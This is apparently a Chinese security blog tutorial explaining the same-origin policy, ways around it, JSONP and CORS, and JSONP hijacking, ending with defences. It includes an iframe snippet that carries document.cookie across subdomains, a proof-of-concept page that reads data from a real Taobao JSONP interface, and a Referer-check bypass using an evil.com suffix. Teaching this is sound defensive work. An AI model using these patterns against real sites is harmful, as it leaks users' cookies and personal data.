---
title: 规避浏览器同源策略 & JSONP的原理和利用
tags:
 - vulneralbility
 - javascript
date: 2019-09-02
---

## 1@ 前言

前端尤其是 Js 越学越发觉得其灵活度是超出一般脚本的。这篇文章，记录下自己对同源策略和 JSONP 的学习，也供有需要的同学参阅。



## 2@ 同源策略

想必搞安全的初期大都会读过道哥的那本**`白帽子`**,书里面靠前的位置就讲过同源策略，不过我想大部分人可能还是对这个概念了解的不是很透彻，我们一起再来温习温习。



> 1995年，同源政策由 Netscape 公司引入浏览器。目前，所有浏览器都实行这个政策。



> 
>
> 同源策略 （Same Origin Policy）是一种约定。
>
> 浏览器的同源策略，限制了来自不同源的 document 或脚本，对当前 document 读取或者设置某些属性。
>
> ​                                                         									---------- 《白帽子讲web安全》



### 2.1 介绍

那么，什么时候两个资源才算是同源呢？

影响两个资源是否同源主要看以下字段是否相同，如果一致，则会被认为是同源的。

- host(域名或者IP地址)
- 子域名
- 端口
- 协议

举个简单的例子：

`http://test1.rt95.com/test.html`

`http://test2.rt95.com/test.html`

上面两个资源就是不同源的，因为他们的子域名不同 。



### 2.2 限制范围

当前，如果非同源，下面的行为会受到限制。

```
（1） Cookie、LocalStorage 和 IndexDB 无法读取。

（2） DOM 无法获得。

（3） AJAX 请求不能发送。
```



### 2.3 规避同源策略的方法

#### 1、Cookie

**如果两个网页的一级域名相同，只是二级域名不同，可以通过设置document.domain 共享 Cookie**



- 上面这句话其实略带迷惑性，容易想当然。其本质就是页面可以设置 document.domain 为当前子域或者比当前子域更高的域。而一个子域的 cookie 包含了其子域和所有比其更高的域的 cookie，下例实质上是间接设置了主站上的 cookie，而使得所有子域都能访问到 cookie。



假如说我们现在有两个测试网站，仅仅是子域名不同，我们通过上面的原理来访问下 cookie 值。

测试网站为阮大佬的博客和书籍页面。

打开 `es6.ruanyifeng.com`,控制台改变域名：

 ![1.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/1.png)



然后设置一个 cookie 值：



 ![2.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/2.png)



继续到博客页面，控制台改变域名和之前相同，然后进行 cookie 访问：

![3.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/3.png)



这种方法只适用于 Cookie 和 iframe 的窗口，LocalStorage 和 IndexDB 不能使用此方法。

一般浏览器前端设置 cookie 的插件，像 EditThisCookie 这种，还是后端设置 cookie，如果没有特殊的用处，都是将 cookie 的 domain 字段设置为当下所属的域，但是如果此域存在一个 xss, 组合利用的话，可以修改 cookie 让另一个子域跨域访问到。





下面再给出一个比较有意思的跨域获取 cookie 的思路：

- 现在在 cms1.test.ink 域下面有一个 1.html,内嵌一个 cms2.test.ink 的 2.html 页面:

```html
<html>
<head>
</head>
<body>
    <iframe src='http://cms2.test.ink/2.html' width='100' height='100'> </iframe>
    <textarea id="zhaochao">
    </textarea>
</body>
</html>
```

- 而 cms2.test.ink 域下面的 2.html 内容如下，其内容是跳转到 cms1.test.ink 域下的 3.html，并且带上自己的cookie：

```html
<html>
<head>
</head>
<body>
<script>
window.location="http://cms1.test.ink/3.html?"+document.cookie;
</script>
</body>
</html>
```

- cms1.test.ink 域下面的 3.html 用来接收跨域传递过来的参数，并写在父页面的文本框里：

```html
<html>
<head>
</head>
<body>
<script>
window.parent.document.getElementById("zhaochao").value=window.location.toString().substring(window.location.toString().indexOf("?"));
</script>
</body>
```

- 访问 cms1.test.ink/1.html,内嵌 cms2.test.ink/2.html，带 cookie 跳转到 cms1.test.ink/3.html 接收参数，写到主页面。

 ![22.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/22.png)



#### 2、iframe

如果两个网页不同源，那么就不能拿到对方的 dom ，像 iframe 和 window.open 窗口，与父窗口无法进行通信。

像在父窗口上使用下述方法来获取 iframe 的标签，就会因为不同源而报错。（本地嵌入一个百度页面进行测试）



 ![4.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/4.png)



如果父子窗口只是二级域名不同，可以效仿上一点 Cookie 的跨越访问那样，设置 `document.domain` 一致即可访问。

下面介绍下完全不同源的网站进行跨域访问的三种方法。

```
片段识别符（fragment identifier）
window.name
跨文档通信API（Cross-document messaging）
```



#### 3、片段识别符

片段识别符（fragment identifier)也就是前端开发中所说的锚点，即 URL 的 `#` 之后的内容。如果知识改变片段识别符，页面不会重新刷新。

这种父子间的访问方法已经浮出水面：父窗口向子窗口的片段标识符中写入数据，而子窗口可以通过创建一个监听 hash 值的方法来获取父窗口传过来的数据，从而达成通信。



```javascript
// 父窗口写入数据
var src = originRL + '#' + data;
$('iframe').get(0).src = src；
```



```javascript
// 子窗口查看数据
window.location.href； // # 之后有 data 的值
```



 ![5.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/5.png)



 ![6.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/6.png)



#### 4、window.name

window.name 这个属性有个特定就是，无论是否同源，只要在同一个窗口里，前一个网页设置了这个属性，后一个网页就可以读取到它。（这种方法只能是子窗口向父窗口发送数据）

我们依旧拿上面的例子来演示：

```
在父窗口中打开子窗口，键入 window.name 的值 ----->
然后改变 window.location 的值进入到父窗口  ----->
父窗口中获得子窗口的标签，然后读取其 window.name 的值
```



 ![7.pg](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/7.png)



 ![8.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/8.png)





#### 5、window.postMessage

上面的方法都属于程序猿们私下闲着没事干破解出来的，而 HTML5 为了解决这个问题。引入了一个全新的 API ：跨文档通信 API （Cross-document-messaging),它为 window 对象多增添了一个 window.postMessage() 的方法，允许跨窗口通信，不管是否同源。



> 举例来说，父窗口`http://aaa.com`向子窗口`http://bbb.com`发消息，调用`postMessage`方法就可以了



我们来看看 w3c 中定义 的 postMessage() 方法的定义

> targetWindow .postMessage（message，targetOrigin，[ transfer ]）
>
> - *targetWindow*
>
>   对将接收消息的窗口的引用。获得此类引用的方法包括：`Window.open` （生成一个新窗口然后引用它），`Window.opener` （引用产生这个的窗口），`HTMLIFrameElement.contentWindow`（`<iframe>`从其父窗口引用嵌入式），`Window.parent`（从嵌入式内部引用父窗口`<iframe>`）`Window.frames` +索引值（命名或数字）。
>
> - *message*
>
>   要发送到其他窗口的数据。使用结构化克隆算法序列化数据。这意味着您可以将各种各样的数据对象安全地传递到目标窗口，而无需自己序列化。
>
> - *targetOrigin*
>
>   指定要调度的事件的`targetWindow`的原点，可以是文字字符串`"*"`（表示没有首选项），也可以是URI。如果在计划调度事件时，`targetWindow`文档的方案，主机名或端口与`targetOrigin`提供的内容不匹配，则不会调度该事件；只有当所有的三个条件都匹配时，将调度该事件。该机制可以控制发送消息的位置；例如，如果`postMessage()`用于传输密码，则该参数必须是URI，其来源与包含密码的消息的预期接收者相同，以防止恶意第三方拦截密码。**始终提供具体的targetOrigin，而不是\*，如果您知道其他窗口的文档应该位于何处。未能提供特定目标会泄露您发送给任何感兴趣的恶意站点的数据。**
>
> - *stransfer*（可选的）
>
>   是与消息一起传输的`Transferable`对象序列。这些对象的所有权将提供给目标端，并且它们在发送端不再可用。
>
>  





```javascript
var popup = window.open('http://bbb.com', 'title');
popup.postMessage('Hello World!', 'http://bbb.com');
```

postMessage 的参数是：

- 1、发送的内容
- 2、接收消息的窗口源，设为 * 时，表示向所有窗口发送。



父子窗口均可以通过监听 message 事件来获取消息：

```javascript
window.addEventListener('message', function(e) {
  console.log(e.data);
},false);
```



message 事件相关的对象有下面属性：

- `event.source`：对发送消息的`window`对象的引用，也就是想要给其发送消息的一方，即上面的 targetWindow。
- `event.origin`: 调用当时发送消息的窗口的原点`postMessage`，即信息来源的一方。
- `event.data`: 消息内容



接下来我们创建一个父子窗口交互的代码示例：



```javascript
// 父窗口 http://127.0.0.1/frametest/test.html
 <iframe src="http://127.0.0.1:8086/child.html" frameborder="0"></iframe>
 <script>
     window.addEventListener('message', receiveMessage);

     function receiveMessage(event) {
         document.write('this is receiver\'s receiving data' + event.data);

      }
 </script>
```



```html
// 子窗口 http://127.0.0.1:8086/child.html
<script>
      window.addEventListener('message', receiveMessage);

      function receiveMessage(event) {
          event.source.postMessage('message_received', event.origin);
          alert(event.data);

        }
</script>
```



然后在父窗口向子窗口发送信息：(注意我们此时需要先拿到 iframe 标签，通过它来向子窗口发送数据)



![9.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/9.png)



 ![10.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/10.png)



 ![11.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/11.png)





### 2.4 补充

尽管有同源策略，但是在浏览器中，`<script>` `img` `iframe` `<link>` 等标签依旧可以跨域加载资源，不受同源策略的控制。一般都是带 **src** 属性的标签，它们加载资源时，其实是由浏览器发出了一次 GET 请求。

除了上面规避同源策略的方法外，还有几种：

- flash插件发送 http 请求，但必须安装 flash ，和 flash 交互。而现在 flash 已经用的越来越少了，在这里就不细究，有兴趣的同学可以参考道哥书里面的第二章内容。
- 可以在同源服务器下架设一个代理服务器来转发，代理服务器负责请求跨域内容，而 js 只负责接收即可。
- 第三种方式即是我们下面要探讨的 JSONP。



## 3@ JSONP 介绍

​	 JSONP 即 JSON with Padding（填充式 JSON），是应用 JSON 的一种新的方法，常用于服务器和客户端跨源通信，在后来的 Web 服务中非常流行。



### 3.1 基础知识

 JSONP 的基本思想就是，网页添加一个 `<script>` 标签，然后向服务器请求数据，服务器传送回来的数据放到请求时 `callback` 关键字函数中进行处理。这种方法不受同源策略的限制。JSONP 有个要求，就是只能用 GET请求，并且要求返回 Javascript，常见可以被浏览器解析为 js 的数据 mime 类型[在这](https://mathiasbynens.be/demo/javascript-mime-type),实际上也就是我们上面补充点中说的，`<script>` 等标签可以跨域加载资源。



我们来看一个例子：

```javascript
// 构造一个加载跨域数据的脚本，来读取当前价格指数
 function refreshPrice(data) { //构造回调函数
            var p = $('p#content').get(0);
            p.innerHTML = '当前价格' +
                data['0000001'].name + ': ' +
                data['0000001'].price + '；' +
                data['1399001'].name + ': ' +
                data['1399001'].price;
        }
  var js = document.createElement('script');
  head = $('head');
  js.src = "http://api.money.126.net/data/feed/0000001,1399001？callback=refreshPrice";
  head.append(js);  // 添加标签，加载数据，触发回调函数
```



 ![12.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/12.png)



从这个例子我们也可以看出来，JSONP 由两部分组成：

- 回调函数
- 请求传入的数据



再举一个我们生活中大概率会碰到的例子：百度。

百度搜索框也是利用了 JSONP 的技术，我们可以通过下面的查询 URL 看出端倪。

`https://sp0.baidu.com/5a1Fazu8AA54nxGko9WTAnF6hhy/su?wd=西电&&cb=a`



结果为：

```json
a(
{
"q": "西电",
"p": false,
"s": [
"西电教务处",
"西电睿思",
"西电迎新网",
"西电图书馆",
"西电研究生",
"西电研究生系统",
"西电研究生院",
"西电信息化建设处",
"西电电院",
"西电就业信息网"
]
}
)
```



s 其实就是搜索结果的匹配项，而 cb 这个参数就是请求资源后的回调函数。





### 3.2 JSONP 实现 ajax 的跨域请求

我们知道，原生 Js 的 ajax 异步请求是有同源策略所限制的，但是有了 JSONP，我们便可以实现跨域请求。

接下来我们构造另一个域的生成 json 内容的 php 文件进行异步加载。

```php
//127.0.0.1:8086/test.php
<?php
$data = array(
    'age'=>20,
    'name'=>'rt95'
);
$callback = $_GET['callback'];

echo $callback."(".json_encode($data).")";
return;
?>
```





```html
//127.0.0.1/frametest/test.html
<html>

<head>
    <script src="jquery.min.js"></script>
    <meta charset="utf-8">
</head>

<body>
    <p id="content"></p>
    <script>
        function handler(data) {
            var p = $('p#content');
            p.html('name : ' + data.name + '<br>' + 'age : ' + data.age);
        }
        $(function() {
            $.ajax({
                type: 'GET',
                url: 'http://127.0.0.1:8086/test.php',
                dataType: 'jsonp',
                jsonp: 'callback', // 请求 php 的参数名
                jsonpCallback: 'handler' // 回调函数名 
            });
        });
    </script>
</body>

</html>
```



运行文件！走你～你是不是发现了报错？长下面这样：

 ![13.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/13.png)



我们可以看到是被 CORS 这个规则给阻止了，那，什么是 CORS 呢？



### 3.3 CORS (跨域资源共享)



> 如果浏览器支持HTML5，那么就可以一劳永逸地使用新的跨域策略：CORS了。
>
> CORS全称Cross-Origin Resource Sharing，是HTML5规范定义的如何跨域访问资源。



首先，我们需要了解：

Origin 表示的是本域，就是浏览器当前页面的域。我们看图说话：



 ![14.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/14.png)



假如我们的本域是 my.com ，待请求的外域为 sina.com，那么只要服务器端的响应头的 **Access-Control-Allow-Origin** 字段有我们的本域，亦或是通配符 * ，本次请求就可以成功。

像 POST ，GET 这样的简单请求只需验证这个字段即可，但是像 PUT，DELETE 等请求，在发送 ajax 之前，浏览器还会先发出一个 OPTION 请求，类似下面这样：

```http
OPTIONS /path/to/resource HTTP/1.1
Host: bar.com
Origin: http://my.com
Access-Control-Request-Method: POST
```

服务器端会给出允许响应的请求类型：

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://my.com
Access-Control-Allow-Methods: POST, GET, PUT, OPTIONS
Access-Control-Max-Age: 86400
```

如果我们刚开始的请求是在字段 **Access-Control-Allow-Methods** 里面，那么浏览器就会继续发送 ajax 请求，否则会抛出错误，终止操作。



有了这些知识，我们就可以很轻松的解决上面的问题了。修改一下服务端的脚本，添加返回头的 **Access-Control-Allow-Origin** 字段。

```php
<?php
header("Access-Control-Allow-Origin:*");
$data = array(
    "age"=>20,
    "name"=>'rt95'
);
$callback = $_GET['callback'];
echo $callback."(".json_encode($data).")";
return;
?>
```



 ![15.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/15.png)





这里有两个点需要注意下：

- dataType 的 T 是大写，一定要注意！！
- 请求界面一定要给返回页面中调用 callback 指定的函数，具体实现根据不同需要而定。







## 4@ JSONP 的劫持

### 4.1 漏洞原理

介绍了这么多知识，接下来我们就来介绍如何具体利用这个可能的漏洞点。

 ![16.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/16.png)





其实上面这张图已经十分清晰的展示了 JSONP 的利用过程。

```
用户注册网站 B ----->
用户访问网站 A ----->
A 网站的恶意脚本功能是通过注册 Callback 函数来像 B 网站发起请求,获得用户在 B 上的信息 ----->
B 网站未做请求检测，返回用户数据 ----->
数据上传至攻击者服务器
```



### 4.2 漏洞危害

> **JSONP是一种敏感信息泄露的漏洞**，经过攻击者巧妙而持久地利用，会对企业和用户造成巨大的危害。攻击者通过巧妙设计一个网站，**网站中包含其他网站的JSONP漏洞利用代码**，将链接通过邮件等形式推送给受害人，**如果受害者点击了链接，则攻击者便可以获取受害者的个人的信息，如邮箱、姓名、手机等信息，**这些信息可以被违法犯罪分子用作“精准诈骗”。对方掌握的个人信息越多，越容易取得受害人的信任，诈骗活动越容易成功，给受害人带来的财产损失以及社会危害也就越大。





### 4.3 漏洞利用



要想利用 JSONP 漏洞，必须找到存在漏洞的接口，这个接口必须满足以下三个条件：

- 泄露出了敏感的信息，如 email,username,严重甚至 token。
- 未检测 referer（可以绕过 HTML5 的 CORS 策略），或者验证方式不太严谨，正则写的不完善等等，譬如设置验证的 referer 为 `http://www.xxx.com `, 但是`http://www.xxx.com.evil.com ` 依旧可以绕过限制。
- 未启用 token 验证。



#### 寻找方法

我们可以使用如下方法来初步粗略的寻找可能存在漏洞的接口。

1、打开浏览器控制台的 Preseve log ,防止之前找到的结果被刷新的页面覆盖。

 ![17.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/17.png)





2、手动通过关键词筛选一些信息，搜索一些关键词，譬如 `callback`,`jsonp` 等，然后以此点进（确实慢，而且效率不高）。

3、这里以淘宝为例，我找到了一个没什么利用价值的页面，只是用来实现整个过程。

 ![18.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/18.png)



4、通过构造恶意代码，诱使登陆的用户访问，然后获得数据。（这里淘宝这个页面确实没做特殊的过滤和访问控制，可能是因为数据没什么利用价值）

```html
<html>

<head>
    <script src="jquery.min.js"></script>
    <meta charset="utf-8">
</head>

<body>
    <p id="content"></p>
    <script>
        function 【回调函数名】(data) {
            var p = $('p#content');
            p.html('ip : ' + data.data.ip + '<br>' + ' region：' + data.data.region + '<br>' + ' city: ' + data.data.city);
        }
        $(function() {
            $.ajax({
                type: 'GET',
                url: '接口名',
                dataType: 'jsonp',
                jsonp: 'callback', // 请求 php 的参数名
                jsonpCallback: '回调函数名' // 回调函数名 
            });
        });
    </script>
</body>

</html>
```



 ![19.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/19.png)

可以看到，数据已经跨域访问，并且输出到了页面上面，如果是敏感数据，危害确实是巨大的。



为了避免手动傻瓜寻找，我们可以编写爬虫脚本来自动化测试。

>（1）Selenium：可用于自动化对网页进行测试，“到处”点击按钮、超链接，以期待测试更多的接口；
>
>（2）Proxy：用于代理所有的请求，过滤出所有包含敏感信息的[JSONP](http://www.infosec-wiki.com/?tag=jsonp)请求，并记录下HTTP请求；
>
>（3）验证脚本：使用上述的HTTP请求，剔除referer字段，再次发出请求，测试返回结果中，是否仍包敏感信息，如果有敏感信息，说明这个接口就是我们要找的！



引用的工具作者将工具放到了[这](https://github.com/qiaofei32/jsonp_info_leak)。



 ![20.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/20.png)



可以看到，速度和效率确实高出不少，但是还是需要一定程度的人工筛选。



### 4.4 漏洞防御



这个漏洞乍看起来利用起来很难。没错，随着网站开发者的安全意识的提升，接口过滤会愈来愈多，但是目前来看还是有很多存在缺陷的接口。想想，如果有个 xss 可利用，拿到 token 之类的数据， jsonp 的防御是否还是坚不可摧呢？

这里我们再补充一点，当服务端出现如下配置时，就算满足条件，服务端也会拒绝返回数据：

````php
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Credentials: true");
````


其中：

> 对应客户端的 `xhrFields.withCredentials: true` 参数，服务器端通过在响应 header 中设置 `Access-Control-Allow-Credentials = true` 来运行客户端携带证书式访问。通过对 Credentials 参数的设置，就可以保持跨域 Ajax 时的 Cookie



### 补充（跨域 ajax 带 cookie 的问题）

上面这段引用说到了在请求页面 ajax 必须带上参数 `withCredentials`,并设置其值为 `true。`

服务端也必须设置头部 `Access-Control-Allow-Credentials = true`。

我们来做个实验：

```html
// 请求页面 本地 1234 端口
<html>

<head>
    <script src="jquery.min.js"></script>
    <meta charset="utf-8">
</head>

<body>
    <p id="content"></p>
    <script>
        function jsonp407(data) {
            var p = $('p#content');
		p.html('name : ' + data.name + '<br>' + ' age：' + data.age + '<br>' + ' cookie: ' + data.cookie);
        }
        $(function() {
            $.ajax({
                type: 'GET',
                url: 'http://SEVER_IP/test.php',
                dataType: 'jsonp',
                jsonp: 'callback', // 请求 php 的参数名
                jsonpCallback: 'jsonp407', // 回调函数名
                xhrFields: {
                	 withCredentials: true   // 设置带 cookie 的参数为true
                }
            });
        });
    </script>
</body>

</html>
```

 

然后在本地浏览器设置一个任意 cookie 值,这里我们本地浏览器在服务器页面下设置 cookie 值 localtest



```php
// 跨域请求页面,远程服务器 80 端口
<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");
//header("Access-Control-Allow-Credentials: true");
$cookie = $_COOKIE['localtest'];
setcookie('rt95','123');
$cookie2 = $_COOKIE['rt95'];
$data = array(
    "age"=>20,
    "cookie"=>$cookie,
    "name"=>'rt95',
    "cookie2"=>$cookie2
);
$callback = $_GET['callback'];
echo $callback."(".json_encode($data).")";
return;
?>
```

访问本地页面：

 ![21.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/jsonp/21.png)

这里需要注意的是，服务端不设置 `Access-Control-Allow-Credentials` 字段的值也是可以传输 cookie 值的(本地跨域和远程跨域测试结果都是如此)，这与许多文档中描述不符，所以会在一定程度上降低攻击的难度。

防御方法：

- 接口处限制 referer 字段，设置随机 token 等。
- 因为有直接利用 callback 函数进行的 xss攻击，我们还要严格控制编码，防止解析为 html ，要严格按照 JSON 格式标准输出 Content-Type 及编码（ Content-Type : application/json; charset=utf-8 ）。
- 严格过滤 callback 函数名及 JSON 里数据的输出。
- 不要使用cookies来自定义JSONP响应。
- 在 JSONP 响应中不要加入用户的个人敏感数据。
- 严谨配置 Access-Control-Allow-Origin 选项。






Reference:

`<白帽子讲web安全>`

`https://www.liaoxuefeng.com/wiki/1022910821149312/1023022332902400`

`http://www.ruanyifeng.com/blog/2016/04/same-origin-policy.html`

`https://www.cnblogs.com/sdcs/p/8484905.html`

`https://blog.csdn.net/qq_38643434/article/details/81430528`

`https://www.cnblogs.com/xiaohuochai/p/6568039.html`

`https://www.k0rz3n.com/2019/03/07/JSONP%20%E5%8A%AB%E6%8C%81%E5%8E%9F%E7%90%86%E4%B8%8E%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/`

`https://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/`

`https://www.freebuf.com/articles/web/70025.html`

`https://www.anquanke.com/post/id/97671`

`https://www.cnblogs.com/52php/p/5677775.html`

`https://www.infosec-wiki.com/?p=455211`

`https://blog.csdn.net/z69183787/article/details/78954325`

`https://www.w3cschool.cn/fetch_api/fetch_api-lx142x8t.html`
